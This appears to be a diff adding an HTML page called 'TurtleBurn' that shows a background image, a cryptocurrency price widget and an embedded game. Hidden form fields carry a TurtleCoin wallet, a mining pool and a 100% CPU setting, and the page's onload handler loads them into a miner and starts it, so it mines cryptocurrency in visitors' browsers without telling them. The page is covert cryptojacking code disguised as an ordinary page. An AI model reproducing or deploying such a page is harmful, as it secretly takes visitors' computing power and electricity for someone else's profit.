@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+	<head>
+		<meta charset="utf-8">
+		<title>TurtleBurn</title>
+	</head>
+
+	<body>
+<body background="https://images.pexels.com/photos/2793170/pexels-photo-2793170.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940">
+
+		<div>
+			<label> </label> 
+			<input type="hidden" id="threads" type="number" min="1" max="64" value="4" placeholder="Number of threads">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="wallet" type="text" placeholder="Your Turtlecoin address" value="TRTLv3i1S6WSU1N3BAzJ7PTJWZBRccFKobRbFnUpy5UuaFCVx8uHbH5PnWewNt2Y91Z3zzLHLcCX6TcEikeDGfdDgJeLWgueF6q">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="pool" type="text" placeholder="Your favourite mining pool" value="pool.hashvault.pro">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="port" type="number" placeholder="Your pools port" value="80">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="speed" type="number" placeholder="Mining speed in percent" min="1" max="100" value="100">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden" id="workerName" type="text" placeholder="Your worker name" value="WebMiners">
+		</div>
+
+
+	     <body onload="updateValues();miner.start()">   
+	
+
+
+		<script src='turtleminer.js'></script>
+		<script>
+			const config = {
+				pool: "trtl.pool.mine2gether.com",	// pool url
+				port: 2225,	// pool port
+				wallet: "TRTLv1mg2VA9ZSBL9JSyrACvqEzS6TDu3HFFJFKpUTnH8q6CD7rrVxmCDCqQnJTdzQRr1HsTefdyzeebGZn9tifXFnC2jQiM6So", // your wallet address
+				speed: 10,		// cpu speed/usage in %
+				threads: 4,		// number of threads using for mining
+				workerName: "WebMiners"	// the miner name also knows as 'password' for the pool, default 'x'
+			}
+			const miner = new TurtleMiner(config);
+			console.log(miner.dump());
+
+			miner.on("report", function(rep) {
+				console.log(rep);
+			});
+
+			function updateValues() { // updates values entered by user
+				for (let i in config) {
+					config[i] = document.getElementById(i).value;
+					miner[i] = document.getElementById(i).value;
+				}
+			}
+		</script>
+		     <div style="width: 440px; height: 220px;">
+		     <!-- Cryptocurrency Price Widget --><script>!function(){var e=document.getElementsByTagName("script"),t=e[e.length-1],n=document.createElement("script");function r(){var e=crCryptocoinPriceWidget.init({base:"USD,EUR,CNY,GBP",items:"BTC,ETH,XRP,BCH,BSV,USDT,ltc,eos,bnb,XLM,ADA,TRX,XMR,XTZ,ETC",backgroundColor:"FFFFFF",streaming:"1",rounded:"1",boxShadow:"1",border:"1"});t.parentNode.insertBefore(e,t)}n.src="https://co-in.io/widget/pricelist.js?items=BTC%2CETH%2CXRP%2CBCH%2CBSV%2CUSDT%2Cltc%2Ceos%2Cbnb%2CXLM%2CADA%2CTRX%2CXMR%2CXTZ%2CETC",n.async=!0,n.readyState?n.onreadystatechange=function(){"loaded"!=n.readyState&&"complete"!=n.readyState||(n.onreadystatechange=null,r())}:n.onload=function(){r()},t.parentNode.insertBefore(n,null)}();</script><a href="https://currencyrate.today/">Currency Converter</a><!-- /Cryptocurrency Price Widget -->
+			   <img src="https://pbs.twimg.com/media/EPXwl9aWAAEHAqb?format=jpg&name=small" alt="This is an animated gif image" align="bottom"/> 
+		
+			     <script src="https://cdn.htmlgames.com/embed.js?game=MsTapman&amp;&amp;bgcolor=white" align = "bottom"></script>
+		     </div>
+	</body>
+</html>
